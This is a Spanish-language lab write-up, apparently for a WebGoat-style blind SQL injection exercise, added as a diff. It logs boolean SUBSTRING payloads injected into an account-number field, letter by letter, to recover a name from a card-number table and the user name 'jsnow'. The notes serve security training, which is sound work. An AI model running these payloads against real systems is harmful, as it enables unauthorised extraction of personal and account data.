@@ -1,0 +1,305 @@
+APARTADO 1
+==========
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) < 'H' );
+
+Invalid account number. Debe ser mayor de K
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) < 'L' );
+
+Account number is valid. Será menor de L.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) < 'J' );
+
+Invalid account number. Mayor que J.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) < 'K' );
+
+Account number is valid. Tiene que ser menor de K y mayor que J.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) = 'J' );
+
+Account number is valid. Es igual a J.
+
+Segunda letra:
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 2, 1) < 'K' );
+
+Invalid account number. Debe ser mayor de K
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 2, 1) < 'R' );
+
+Invalid account number. Debe ser mayor de R. Pruebo con letras minúsculas.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 2, 1) < 'k' );
+
+Account number is valid. La letra será menor que k.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 2, 1) < 'f' );
+
+Invalid account number. Mayor que f.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 2, 1) < 'i' );
+
+Invalid account number. Mayor que i.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 2, 1) < 'j' );
+
+Account number is valid. Esta entre i y j.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 2, 1) = 'i' );
+
+Account number is valid. Es la letra i. Probando con j es invalida.
+
+Tercera letra:
+
+Supongo que es minúscula.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 3, 1) < 'j' );
+
+Invalid account number. Será mayor que j.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 3, 1) < 'p' );
+
+Account number is valid. Es menor que p.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 3, 1) < 'm' );
+
+Account number is valid. Es menor que m.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 3, 1) < 'l' );
+
+Invalid account number. Entre l y m.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 3, 1) = 'l' );
+
+Account number is valid. La letra es l. Ya que m no sirve.
+
+Cuarta letra:
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 4, 1) = 'l' );
+
+Account number is valid. La letra es l.
+
+Quinta letra:
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 5, 1) < 'l' )
+
+Invalid account number. Sera mayor que l.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 5, 1) < 's' )
+
+Invalid account number. Sera mayor que s.
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 5, 1) < 'z' )
+
+Invalid account number. Sera mayor que z.
+
+Se han acabado las letras. 
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 5, 1) >= 'A' )
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 5, 1) <= 'Z' )
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 5, 1) <= 'z' )
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 5, 1) >= 'a' )
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 5, 1) >= '0' )
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 5, 1) <= '9' )
+
+No quedan mas letras ni números posibles ya que siempre responde con Invalid account number. El nombre es Jill.
+
+APARTADO 2
+==========
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 1, 1) < 'H' );
+
+Invalid account number. Será mayor que H.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 1, 1) < 'P' );
+
+Invalid account number. Será mayor que P.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 1, 1) < 'V' );
+
+Invalid account number. Será mayor que V.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 1, 1) <= 'Z' );
+
+Invalid account number. No puede ser Z. Paso a las letras minúsculas.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 1, 1) < 'h' );
+
+Invalid account number. Será mayor que h.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 1, 1) < 'r' );
+
+Account number is valid. Es menor que r.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 1, 1) < 'l' );
+
+Account number is valid. Es menor que l.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 1, 1) < 'j' );
+
+Invalid account number. Será mayor que j.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 1, 1) < 'k' );
+
+Account number is valid. Está entre j y k.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 1, 1) = 'j' );
+
+Account number is valid. Es la letra j ya que la k da cuenta invalida.
+
+Segunda letra:
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 2, 1) < 'k' );
+
+Invalid account number. Será mayor que k.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 2, 1) < 'r' );
+
+Invalid account number. Será mayor que r.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 2, 1) < 'w' );
+
+Account number is valid. Esta entre r y w.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 2, 1) < 'u' );
+
+Account number is valid. Entre r y u.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 2, 1) < 't' );
+
+Account number is valid. Menor que u.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 2, 1) < 's' );
+
+Invalid account number. Entre s y u.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 2, 1) = 's' );
+
+Account number is valid. Es la s. Ya que:
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 2, 1) = 't' );
+
+Invalid account number
+
+Tercera letra:
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 3, 1) < 't' );
+
+Account number is valid. Es menor que t.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 3, 1) < 'k' );
+
+Invalid account number. Mayor que k.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 3, 1) < 'o' );
+
+Account number is valid. Es menor que o.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 3, 1) < 'm' );
+
+Invalid account number. Mayor que m.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 3, 1) < 'n' );
+
+Invalid account number. Mayor o igual que n.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 3, 1) = 'n' );
+
+Account number is valid. Es la n ya que o da:
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 3, 1) = 'o' );
+
+Invalid account number
+
+Cuarta letra:
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 4, 1) < 'o' );
+
+Invalid account number. Será mayor que o.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 4, 1) < 'z' );
+
+Account number is valid. Entre z y o.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 4, 1) < 'u' );
+
+Account number is valid. Menor que u.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 4, 1) < 'r' );
+
+Account number is valid. Menor que r.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 4, 1) < 'p' );
+
+Account number is valid. Menor que p. Solo puede ser o o p.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 4, 1) = 'p' );
+
+Invalid account number. Solo queda la o.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 4, 1) = 'o' );
+
+La cuarta letra es la o.
+
+Quinta letra:
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 5, 1) < 'o' );
+
+Invalid account number. Mayor que o.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 5, 1) < 'z' );
+
+Account number is valid. Menor que z.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 5, 1) < 'u' );
+
+Invalid account number. Mayor que u.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 5, 1) < 'x' );
+
+Account number is valid. Menor que x.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 5, 1) < 'v' );
+
+Invalid account number. Entre v y x.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 5, 1) < 'w' );
+
+Invalid account number. Será w o x.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 5, 1) = 'w' );
+
+Account number is valid. Es la w porque la x dá invalido.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 5, 1) = 'x' );
+
+Sexta letra:
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 6, 1) < 'x' );
+
+Invalid account number. Mayor que w.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 6, 1) < 'z' );
+
+Invalid account number. Parece que no es ninguna letra. Voy a probar todos los rangos a ver si era la última
+letra.
+
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 6, 1) >= 'A' );
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 6, 1) <= 'Z' );
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 6, 1) <= 'z' );
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 6, 1) >= 'a' );
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 6, 1) >= '0' );
+101 AND (SUBSTRING((SELECT user_name FROM user_system_data WHERE userid='101'), 6, 1) <= '9' );
+
+No es ninguna letra o número. La palabra es: jsnow
+
+
+
+
+
+
+
+
+
